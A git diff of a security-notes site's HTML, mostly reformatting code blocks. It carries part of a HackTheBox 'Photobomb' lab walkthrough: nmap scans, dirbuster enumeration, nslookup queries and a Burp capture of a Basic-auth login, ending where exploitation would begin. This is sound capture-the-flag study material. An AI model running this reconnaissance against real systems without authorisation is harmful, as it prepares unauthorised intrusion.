@@ -683,6 +683,8 @@
       
         
       
+        
+      
     
     
     
@@ -765,6 +767,27 @@
   
   <span class="md-ellipsis">
     ADB
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../adidnsdump/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    adidnsdump
   </span>
   
 
@@ -17176,234 +17199,349 @@ https://github.com/mkdocs/mkdocs/blob/master/mkdocs/themes/mkdocs/content.html -
 </table>
 <h3 id="recon">Recon</h3>
 <p>For the sake of commodity, we'll create a variable:</p>
-<div class="language-bash highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a><span class="nb">export</span><span class="w"> </span><span class="nv">ip</span><span class="o">=</span><span class="m">10</span>.10.11.182
-</span></code></pre></div>
+<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-0-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1"></a><span class="nb">export</span><span class="w"> </span><span class="nv">ip</span><span class="o">=</span><span class="m">10</span>.10.11.182
+</span></code></pre></div></td></tr></table></div>
 <h4 id="service-port-enumeration">Service/ Port enumeration</h4>
 <p>Run nmap to enumerate open ports, services, OS, and traceroute</p>
 <p>General enumeration not to make too much noise:
-<div class="language-sh highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>sudo<span class="w"> </span>nmap<span class="w"> </span><span class="nv">$ip</span><span class="w"> </span>-Pn
-</span></code></pre></div>
+<div class="language-sh highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-1-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1"></a>sudo<span class="w"> </span>nmap<span class="w"> </span><span class="nv">$ip</span><span class="w"> </span>-Pn
+</span></code></pre></div></td></tr></table></div>
 Results:
-<div class="language-text highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a>Starting Nmap 7.92 ( https://nmap.org ) at 2022-10-20 12:34 EDT
-</span><span id="__span-2-2"><a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a>Nmap scan report for 10.10.11.182
-</span><span id="__span-2-3"><a id="__codelineno-2-3" name="__codelineno-2-3" href="#__codelineno-2-3"></a>Host is up (0.095s latency).
-</span><span id="__span-2-4"><a id="__codelineno-2-4" name="__codelineno-2-4" href="#__codelineno-2-4"></a>Not shown: 998 closed tcp ports (reset)
-</span><span id="__span-2-5"><a id="__codelineno-2-5" name="__codelineno-2-5" href="#__codelineno-2-5"></a>PORT   STATE SERVICE
-</span><span id="__span-2-6"><a id="__codelineno-2-6" name="__codelineno-2-6" href="#__codelineno-2-6"></a>22/tcp open  ssh
-</span><span id="__span-2-7"><a id="__codelineno-2-7" name="__codelineno-2-7" href="#__codelineno-2-7"></a>80/tcp open  http
-</span></code></pre></div>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-2-1">1</a></span>
+<span class="normal"><a href="#__codelineno-2-2">2</a></span>
+<span class="normal"><a href="#__codelineno-2-3">3</a></span>
+<span class="normal"><a href="#__codelineno-2-4">4</a></span>
+<span class="normal"><a href="#__codelineno-2-5">5</a></span>
+<span class="normal"><a href="#__codelineno-2-6">6</a></span>
+<span class="normal"><a href="#__codelineno-2-7">7</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1"></a>Starting Nmap 7.92 ( https://nmap.org ) at 2022-10-20 12:34 EDT
+</span><span id="__span-2-2"><a id="__codelineno-2-2" name="__codelineno-2-2"></a>Nmap scan report for 10.10.11.182
+</span><span id="__span-2-3"><a id="__codelineno-2-3" name="__codelineno-2-3"></a>Host is up (0.095s latency).
+</span><span id="__span-2-4"><a id="__codelineno-2-4" name="__codelineno-2-4"></a>Not shown: 998 closed tcp ports (reset)
+</span><span id="__span-2-5"><a id="__codelineno-2-5" name="__codelineno-2-5"></a>PORT   STATE SERVICE
+</span><span id="__span-2-6"><a id="__codelineno-2-6" name="__codelineno-2-6"></a>22/tcp open  ssh
+</span><span id="__span-2-7"><a id="__codelineno-2-7" name="__codelineno-2-7"></a>80/tcp open  http
+</span></code></pre></div></td></tr></table></div>
 Once you know open ports, run nmap to see service versions and more details: <br />
-<div class="language-text highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a>sudo nmap -sCV -p22,80 $ip
-</span></code></pre></div>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-3-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1"></a>sudo nmap -sCV -p22,80 $ip
+</span></code></pre></div></td></tr></table></div>
 Results:
-<div class="language-text highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a>PORT   STATE SERVICE VERSION
-</span><span id="__span-4-2"><a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a>22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
-</span><span id="__span-4-3"><a id="__codelineno-4-3" name="__codelineno-4-3" href="#__codelineno-4-3"></a>| ssh-hostkey:
-</span><span id="__span-4-4"><a id="__codelineno-4-4" name="__codelineno-4-4" href="#__codelineno-4-4"></a>|   3072 e2:24:73:bb:fb:df:5c:b5:20:b6:68:76:74:8a:b5:8d (RSA)
-</span><span id="__span-4-5"><a id="__codelineno-4-5" name="__codelineno-4-5" href="#__codelineno-4-5"></a>|   256 04:e3:ac:6e:18:4e:1b:7e:ff:ac:4f:e3:9d:d2:1b:ae (ECDSA)
-</span><span id="__span-4-6"><a id="__codelineno-4-6" name="__codelineno-4-6" href="#__codelineno-4-6"></a>|_  256 20:e0:5d:8c:ba:71:f0:8c:3a:18:19:f2:40:11:d2:9e (ED25519)
-</span><span id="__span-4-7"><a id="__codelineno-4-7" name="__codelineno-4-7" href="#__codelineno-4-7"></a>80/tcp open  http    nginx 1.18.0 (Ubuntu)
-</span><span id="__span-4-8"><a id="__codelineno-4-8" name="__codelineno-4-8" href="#__codelineno-4-8"></a>|_http-title: Did not follow redirect to http://photobomb.htb/
-</span><span id="__span-4-9"><a id="__codelineno-4-9" name="__codelineno-4-9" href="#__codelineno-4-9"></a>|_http-server-header: nginx/1.18.0 (Ubuntu)
-</span><span id="__span-4-10"><a id="__codelineno-4-10" name="__codelineno-4-10" href="#__codelineno-4-10"></a>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
-</span></code></pre></div>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-4-1"> 1</a></span>
+<span class="normal"><a href="#__codelineno-4-2"> 2</a></span>
+<span class="normal"><a href="#__codelineno-4-3"> 3</a></span>
+<span class="normal"><a href="#__codelineno-4-4"> 4</a></span>
+<span class="normal"><a href="#__codelineno-4-5"> 5</a></span>
+<span class="normal"><a href="#__codelineno-4-6"> 6</a></span>
+<span class="normal"><a href="#__codelineno-4-7"> 7</a></span>
+<span class="normal"><a href="#__codelineno-4-8"> 8</a></span>
+<span class="normal"><a href="#__codelineno-4-9"> 9</a></span>
+<span class="normal"><a href="#__codelineno-4-10">10</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1"></a>PORT   STATE SERVICE VERSION
+</span><span id="__span-4-2"><a id="__codelineno-4-2" name="__codelineno-4-2"></a>22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
+</span><span id="__span-4-3"><a id="__codelineno-4-3" name="__codelineno-4-3"></a>| ssh-hostkey:
+</span><span id="__span-4-4"><a id="__codelineno-4-4" name="__codelineno-4-4"></a>|   3072 e2:24:73:bb:fb:df:5c:b5:20:b6:68:76:74:8a:b5:8d (RSA)
+</span><span id="__span-4-5"><a id="__codelineno-4-5" name="__codelineno-4-5"></a>|   256 04:e3:ac:6e:18:4e:1b:7e:ff:ac:4f:e3:9d:d2:1b:ae (ECDSA)
+</span><span id="__span-4-6"><a id="__codelineno-4-6" name="__codelineno-4-6"></a>|_  256 20:e0:5d:8c:ba:71:f0:8c:3a:18:19:f2:40:11:d2:9e (ED25519)
+</span><span id="__span-4-7"><a id="__codelineno-4-7" name="__codelineno-4-7"></a>80/tcp open  http    nginx 1.18.0 (Ubuntu)
+</span><span id="__span-4-8"><a id="__codelineno-4-8" name="__codelineno-4-8"></a>|_http-title: Did not follow redirect to http://photobomb.htb/
+</span><span id="__span-4-9"><a id="__codelineno-4-9" name="__codelineno-4-9"></a>|_http-server-header: nginx/1.18.0 (Ubuntu)
+</span><span id="__span-4-10"><a id="__codelineno-4-10" name="__codelineno-4-10"></a>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</span></code></pre></div></td></tr></table></div>
 We open 10.10.11.182 in the browser. A redirection to http://photobomp.htb occurs, but the server is not found. So we add this routing in our /etc/hosts file:</p>
 <p>We open the /etc/hosts file with an editor. For instance, nano.
-<div class="language-text highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a>sudo nano /etc/hosts
-</span></code></pre></div>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-5-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1"></a>sudo nano /etc/hosts
+</span></code></pre></div></td></tr></table></div>
 We move the cursor to the end and we add these lines:
-<div class="language-text highlight"><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a>10.10.11.182    photobomb.htb
-</span></code></pre></div></p>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-6-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1"></a>10.10.11.182    photobomb.htb
+</span></code></pre></div></td></tr></table></div></p>
 <h4 id="directory-enumeration">Directory enumeration</h4>
 <p>We can use dirbuster to enumerate directories:
-<div class="language-text highlight"><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a>dirbuster
-</span></code></pre></div>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-7-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1"></a>dirbuster
+</span></code></pre></div></td></tr></table></div>
 And we configure it to launch this dictionary: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt</p>
 <p>Results:
-<div class="language-text highlight"><pre><span></span><code><span id="__span-8-1"><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a>Dirs found with a 200 response:
-</span><span id="__span-8-2"><a id="__codelineno-8-2" name="__codelineno-8-2" href="#__codelineno-8-2"></a>
-</span><span id="__span-8-3"><a id="__codelineno-8-3" name="__codelineno-8-3" href="#__codelineno-8-3"></a>/
-</span><span id="__span-8-4"><a id="__codelineno-8-4" name="__codelineno-8-4" href="#__codelineno-8-4"></a>
-</span><span id="__span-8-5"><a id="__codelineno-8-5" name="__codelineno-8-5" href="#__codelineno-8-5"></a>Dirs found with a 401 response:
-</span><span id="__span-8-6"><a id="__codelineno-8-6" name="__codelineno-8-6" href="#__codelineno-8-6"></a>
-</span><span id="__span-8-7"><a id="__codelineno-8-7" name="__codelineno-8-7" href="#__codelineno-8-7"></a>/printer/
-</span><span id="__span-8-8"><a id="__codelineno-8-8" name="__codelineno-8-8" href="#__codelineno-8-8"></a>/printers/
-</span><span id="__span-8-9"><a id="__codelineno-8-9" name="__codelineno-8-9" href="#__codelineno-8-9"></a>/printerfriendly/
-</span><span id="__span-8-10"><a id="__codelineno-8-10" name="__codelineno-8-10" href="#__codelineno-8-10"></a>/printer_friendly/
-</span><span id="__span-8-11"><a id="__codelineno-8-11" name="__codelineno-8-11" href="#__codelineno-8-11"></a>/printer_icon/
-</span><span id="__span-8-12"><a id="__codelineno-8-12" name="__codelineno-8-12" href="#__codelineno-8-12"></a>/printer-icon/
-</span><span id="__span-8-13"><a id="__codelineno-8-13" name="__codelineno-8-13" href="#__codelineno-8-13"></a>/printer-friendly/
-</span><span id="__span-8-14"><a id="__codelineno-8-14" name="__codelineno-8-14" href="#__codelineno-8-14"></a>/printerFriendly/
-</span><span id="__span-8-15"><a id="__codelineno-8-15" name="__codelineno-8-15" href="#__codelineno-8-15"></a>/printersupplies/
-</span><span id="__span-8-16"><a id="__codelineno-8-16" name="__codelineno-8-16" href="#__codelineno-8-16"></a>/printer1/
-</span><span id="__span-8-17"><a id="__codelineno-8-17" name="__codelineno-8-17" href="#__codelineno-8-17"></a>
-</span><span id="__span-8-18"><a id="__codelineno-8-18" name="__codelineno-8-18" href="#__codelineno-8-18"></a>
-</span><span id="__span-8-19"><a id="__codelineno-8-19" name="__codelineno-8-19" href="#__codelineno-8-19"></a>--------------------------------
-</span><span id="__span-8-20"><a id="__codelineno-8-20" name="__codelineno-8-20" href="#__codelineno-8-20"></a>Files found during testing:
-</span><span id="__span-8-21"><a id="__codelineno-8-21" name="__codelineno-8-21" href="#__codelineno-8-21"></a>
-</span><span id="__span-8-22"><a id="__codelineno-8-22" name="__codelineno-8-22" href="#__codelineno-8-22"></a>Files found with a 401 response:
-</span><span id="__span-8-23"><a id="__codelineno-8-23" name="__codelineno-8-23" href="#__codelineno-8-23"></a>
-</span><span id="__span-8-24"><a id="__codelineno-8-24" name="__codelineno-8-24" href="#__codelineno-8-24"></a>/printer
-</span><span id="__span-8-25"><a id="__codelineno-8-25" name="__codelineno-8-25" href="#__codelineno-8-25"></a>/printer.php
-</span><span id="__span-8-26"><a id="__codelineno-8-26" name="__codelineno-8-26" href="#__codelineno-8-26"></a>/printers.php
-</span><span id="__span-8-27"><a id="__codelineno-8-27" name="__codelineno-8-27" href="#__codelineno-8-27"></a>/printerfriendly.php
-</span><span id="__span-8-28"><a id="__codelineno-8-28" name="__codelineno-8-28" href="#__codelineno-8-28"></a>/printer_friendly.php
-</span><span id="__span-8-29"><a id="__codelineno-8-29" name="__codelineno-8-29" href="#__codelineno-8-29"></a>/printer_icon.php
-</span><span id="__span-8-30"><a id="__codelineno-8-30" name="__codelineno-8-30" href="#__codelineno-8-30"></a>/printer-friendly.php
-</span><span id="__span-8-31"><a id="__codelineno-8-31" name="__codelineno-8-31" href="#__codelineno-8-31"></a>/printerFriendly.php
-</span><span id="__span-8-32"><a id="__codelineno-8-32" name="__codelineno-8-32" href="#__codelineno-8-32"></a>/printersupplies.php
-</span><span id="__span-8-33"><a id="__codelineno-8-33" name="__codelineno-8-33" href="#__codelineno-8-33"></a>/printer1.php
-</span><span id="__span-8-34"><a id="__codelineno-8-34" name="__codelineno-8-34" href="#__codelineno-8-34"></a>
-</span><span id="__span-8-35"><a id="__codelineno-8-35" name="__codelineno-8-35" href="#__codelineno-8-35"></a>Files found with a 200 response:
-</span><span id="__span-8-36"><a id="__codelineno-8-36" name="__codelineno-8-36" href="#__codelineno-8-36"></a>
-</span><span id="__span-8-37"><a id="__codelineno-8-37" name="__codelineno-8-37" href="#__codelineno-8-37"></a>/photobomb.js
-</span></code></pre></div></p>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-8-1"> 1</a></span>
+<span class="normal"><a href="#__codelineno-8-2"> 2</a></span>
+<span class="normal"><a href="#__codelineno-8-3"> 3</a></span>
+<span class="normal"><a href="#__codelineno-8-4"> 4</a></span>
+<span class="normal"><a href="#__codelineno-8-5"> 5</a></span>
+<span class="normal"><a href="#__codelineno-8-6"> 6</a></span>
+<span class="normal"><a href="#__codelineno-8-7"> 7</a></span>
+<span class="normal"><a href="#__codelineno-8-8"> 8</a></span>
+<span class="normal"><a href="#__codelineno-8-9"> 9</a></span>
+<span class="normal"><a href="#__codelineno-8-10">10</a></span>
+<span class="normal"><a href="#__codelineno-8-11">11</a></span>
+<span class="normal"><a href="#__codelineno-8-12">12</a></span>
+<span class="normal"><a href="#__codelineno-8-13">13</a></span>
+<span class="normal"><a href="#__codelineno-8-14">14</a></span>
+<span class="normal"><a href="#__codelineno-8-15">15</a></span>
+<span class="normal"><a href="#__codelineno-8-16">16</a></span>
+<span class="normal"><a href="#__codelineno-8-17">17</a></span>
+<span class="normal"><a href="#__codelineno-8-18">18</a></span>
+<span class="normal"><a href="#__codelineno-8-19">19</a></span>
+<span class="normal"><a href="#__codelineno-8-20">20</a></span>
+<span class="normal"><a href="#__codelineno-8-21">21</a></span>
+<span class="normal"><a href="#__codelineno-8-22">22</a></span>
+<span class="normal"><a href="#__codelineno-8-23">23</a></span>
+<span class="normal"><a href="#__codelineno-8-24">24</a></span>
+<span class="normal"><a href="#__codelineno-8-25">25</a></span>
+<span class="normal"><a href="#__codelineno-8-26">26</a></span>
+<span class="normal"><a href="#__codelineno-8-27">27</a></span>
+<span class="normal"><a href="#__codelineno-8-28">28</a></span>
+<span class="normal"><a href="#__codelineno-8-29">29</a></span>
+<span class="normal"><a href="#__codelineno-8-30">30</a></span>
+<span class="normal"><a href="#__codelineno-8-31">31</a></span>
+<span class="normal"><a href="#__codelineno-8-32">32</a></span>
+<span class="normal"><a href="#__codelineno-8-33">33</a></span>
+<span class="normal"><a href="#__codelineno-8-34">34</a></span>
+<span class="normal"><a href="#__codelineno-8-35">35</a></span>
+<span class="normal"><a href="#__codelineno-8-36">36</a></span>
+<span class="normal"><a href="#__codelineno-8-37">37</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-8-1"><a id="__codelineno-8-1" name="__codelineno-8-1"></a>Dirs found with a 200 response:
+</span><span id="__span-8-2"><a id="__codelineno-8-2" name="__codelineno-8-2"></a>
+</span><span id="__span-8-3"><a id="__codelineno-8-3" name="__codelineno-8-3"></a>/
+</span><span id="__span-8-4"><a id="__codelineno-8-4" name="__codelineno-8-4"></a>
+</span><span id="__span-8-5"><a id="__codelineno-8-5" name="__codelineno-8-5"></a>Dirs found with a 401 response:
+</span><span id="__span-8-6"><a id="__codelineno-8-6" name="__codelineno-8-6"></a>
+</span><span id="__span-8-7"><a id="__codelineno-8-7" name="__codelineno-8-7"></a>/printer/
+</span><span id="__span-8-8"><a id="__codelineno-8-8" name="__codelineno-8-8"></a>/printers/
+</span><span id="__span-8-9"><a id="__codelineno-8-9" name="__codelineno-8-9"></a>/printerfriendly/
+</span><span id="__span-8-10"><a id="__codelineno-8-10" name="__codelineno-8-10"></a>/printer_friendly/
+</span><span id="__span-8-11"><a id="__codelineno-8-11" name="__codelineno-8-11"></a>/printer_icon/
+</span><span id="__span-8-12"><a id="__codelineno-8-12" name="__codelineno-8-12"></a>/printer-icon/
+</span><span id="__span-8-13"><a id="__codelineno-8-13" name="__codelineno-8-13"></a>/printer-friendly/
+</span><span id="__span-8-14"><a id="__codelineno-8-14" name="__codelineno-8-14"></a>/printerFriendly/
+</span><span id="__span-8-15"><a id="__codelineno-8-15" name="__codelineno-8-15"></a>/printersupplies/
+</span><span id="__span-8-16"><a id="__codelineno-8-16" name="__codelineno-8-16"></a>/printer1/
+</span><span id="__span-8-17"><a id="__codelineno-8-17" name="__codelineno-8-17"></a>
+</span><span id="__span-8-18"><a id="__codelineno-8-18" name="__codelineno-8-18"></a>
+</span><span id="__span-8-19"><a id="__codelineno-8-19" name="__codelineno-8-19"></a>--------------------------------
+</span><span id="__span-8-20"><a id="__codelineno-8-20" name="__codelineno-8-20"></a>Files found during testing:
+</span><span id="__span-8-21"><a id="__codelineno-8-21" name="__codelineno-8-21"></a>
+</span><span id="__span-8-22"><a id="__codelineno-8-22" name="__codelineno-8-22"></a>Files found with a 401 response:
+</span><span id="__span-8-23"><a id="__codelineno-8-23" name="__codelineno-8-23"></a>
+</span><span id="__span-8-24"><a id="__codelineno-8-24" name="__codelineno-8-24"></a>/printer
+</span><span id="__span-8-25"><a id="__codelineno-8-25" name="__codelineno-8-25"></a>/printer.php
+</span><span id="__span-8-26"><a id="__codelineno-8-26" name="__codelineno-8-26"></a>/printers.php
+</span><span id="__span-8-27"><a id="__codelineno-8-27" name="__codelineno-8-27"></a>/printerfriendly.php
+</span><span id="__span-8-28"><a id="__codelineno-8-28" name="__codelineno-8-28"></a>/printer_friendly.php
+</span><span id="__span-8-29"><a id="__codelineno-8-29" name="__codelineno-8-29"></a>/printer_icon.php
+</span><span id="__span-8-30"><a id="__codelineno-8-30" name="__codelineno-8-30"></a>/printer-friendly.php
+</span><span id="__span-8-31"><a id="__codelineno-8-31" name="__codelineno-8-31"></a>/printerFriendly.php
+</span><span id="__span-8-32"><a id="__codelineno-8-32" name="__codelineno-8-32"></a>/printersupplies.php
+</span><span id="__span-8-33"><a id="__codelineno-8-33" name="__codelineno-8-33"></a>/printer1.php
+</span><span id="__span-8-34"><a id="__codelineno-8-34" name="__codelineno-8-34"></a>
+</span><span id="__span-8-35"><a id="__codelineno-8-35" name="__codelineno-8-35"></a>Files found with a 200 response:
+</span><span id="__span-8-36"><a id="__codelineno-8-36" name="__codelineno-8-36"></a>
+</span><span id="__span-8-37"><a id="__codelineno-8-37" name="__codelineno-8-37"></a>/photobomb.js
+</span></code></pre></div></td></tr></table></div></p>
 <p>As we wait, we do a dns enumeration:</p>
 <h4 id="dns-enumeration">DNS enumeration</h4>
 <p>Running:
-<div class="language-text highlight"><pre><span></span><code><span id="__span-9-1"><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a>nslookup
-</span></code></pre></div>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-9-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-9-1"><a id="__codelineno-9-1" name="__codelineno-9-1"></a>nslookup
+</span></code></pre></div></td></tr></table></div>
 And after that:
-<div class="language-text highlight"><pre><span></span><code><span id="__span-10-1"><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a>&gt; SERVER 10.10.11.182
-</span></code></pre></div>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-10-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-10-1"><a id="__codelineno-10-1" name="__codelineno-10-1"></a>&gt; SERVER 10.10.11.182
+</span></code></pre></div></td></tr></table></div>
 Results:
-<div class="language-text highlight"><pre><span></span><code><span id="__span-11-1"><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a>Default server: 10.10.11.182
-</span><span id="__span-11-2"><a id="__codelineno-11-2" name="__codelineno-11-2" href="#__codelineno-11-2"></a>Address: 10.10.11.182#53
-</span></code></pre></div>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-11-1">1</a></span>
+<span class="normal"><a href="#__codelineno-11-2">2</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-11-1"><a id="__codelineno-11-1" name="__codelineno-11-1"></a>Default server: 10.10.11.182
+</span><span id="__span-11-2"><a id="__codelineno-11-2" name="__codelineno-11-2"></a>Address: 10.10.11.182#53
+</span></code></pre></div></td></tr></table></div>
 Then, we run:
-<div class="language-text highlight"><pre><span></span><code><span id="__span-12-1"><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a>&gt; 10.10.11.182
-</span></code></pre></div>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-12-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-12-1"><a id="__codelineno-12-1" name="__codelineno-12-1"></a>&gt; 10.10.11.182
+</span></code></pre></div></td></tr></table></div>
 And as a result, we have:
-<div class="language-text highlight"><pre><span></span><code><span id="__span-13-1"><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a>** server can&#39;t find 182.11.10.10.in-addr.arpa: NXDOMAIN
-</span></code></pre></div>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-13-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-13-1"><a id="__codelineno-13-1" name="__codelineno-13-1"></a>** server can&#39;t find 182.11.10.10.in-addr.arpa: NXDOMAIN
+</span></code></pre></div></td></tr></table></div>
 So there is no result.</p>
 <h3 id="exploiting-the-login-page">Exploiting the login page</h3>
 <p>At http://photobomb.htb/printer we find a login page. Use Burp to capture the request of a failed login using "username" as username and "password" as a password.
-<div class="language-text highlight"><pre><span></span><code><span id="__span-14-1"><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a>GET /printer HTTP/1.1
-</span><span id="__span-14-2"><a id="__codelineno-14-2" name="__codelineno-14-2" href="#__codelineno-14-2"></a>Host: photobomb.htb
-</span><span id="__span-14-3"><a id="__codelineno-14-3" name="__codelineno-14-3" href="#__codelineno-14-3"></a>User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
-</span><span id="__span-14-4"><a id="__codelineno-14-4" name="__codelineno-14-4" href="#__codelineno-14-4"></a>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
-</span><span id="__span-14-5"><a id="__codelineno-14-5" name="__codelineno-14-5" href="#__codelineno-14-5"></a>Accept-Language: en-US,en;q=0.5
-</span><span id="__span-14-6"><a id="__codelineno-14-6" name="__codelineno-14-6" href="#__codelineno-14-6"></a>Accept-Encoding: gzip, deflate
-</span><span id="__span-14-7"><a id="__codelineno-14-7" name="__codelineno-14-7" href="#__codelineno-14-7"></a>Connection: close
-</span><span id="__span-14-8"><a id="__codelineno-14-8" name="__codelineno-14-8" href="#__codelineno-14-8"></a>Referer: http://photobomb.htb/
-</span><span id="__span-14-9"><a id="__codelineno-14-9" name="__codelineno-14-9" href="#__codelineno-14-9"></a>Upgrade-Insecure-Requests: 1
-</span><span id="__span-14-10"><a id="__codelineno-14-10" name="__codelineno-14-10" href="#__codelineno-14-10"></a>Authorization: Basic dXNlcm5hbWU6cGFzc3dvcmQ=
-</span></code></pre></div>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-14-1"> 1</a></span>
+<span class="normal"><a href="#__codelineno-14-2"> 2</a></span>
+<span class="normal"><a href="#__codelineno-14-3"> 3</a></span>
+<span class="normal"><a href="#__codelineno-14-4"> 4</a></span>
+<span class="normal"><a href="#__codelineno-14-5"> 5</a></span>
+<span class="normal"><a href="#__codelineno-14-6"> 6</a></span>
+<span class="normal"><a href="#__codelineno-14-7"> 7</a></span>
+<span class="normal"><a href="#__codelineno-14-8"> 8</a></span>
+<span class="normal"><a href="#__codelineno-14-9"> 9</a></span>
+<span class="normal"><a href="#__codelineno-14-10">10</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-14-1"><a id="__codelineno-14-1" name="__codelineno-14-1"></a>GET /printer HTTP/1.1
+</span><span id="__span-14-2"><a id="__codelineno-14-2" name="__codelineno-14-2"></a>Host: photobomb.htb
+</span><span id="__span-14-3"><a id="__codelineno-14-3" name="__codelineno-14-3"></a>User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+</span><span id="__span-14-4"><a id="__codelineno-14-4" name="__codelineno-14-4"></a>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+</span><span id="__span-14-5"><a id="__codelineno-14-5" name="__codelineno-14-5"></a>Accept-Language: en-US,en;q=0.5
+</span><span id="__span-14-6"><a id="__codelineno-14-6" name="__codelineno-14-6"></a>Accept-Encoding: gzip, deflate
+</span><span id="__span-14-7"><a id="__codelineno-14-7" name="__codelineno-14-7"></a>Connection: close
+</span><span id="__span-14-8"><a id="__codelineno-14-8" name="__codelineno-14-8"></a>Referer: http://photobomb.htb/
+</span><span id="__span-14-9"><a id="__codelineno-14-9" name="__codelineno-14-9"></a>Upgrade-Insecure-Requests: 1
+</span><span id="__span-14-10"><a id="__codelineno-14-10" name="__codelineno-14-10"></a>Authorization: Basic dXNlcm5hbWU6cGFzc3dvcmQ=
+</span></code></pre></div></td></tr></table></div>
 The authorization is the text "username:password" encoded in base64, which is known as Basic HTTP Authentication Scheme.</p>
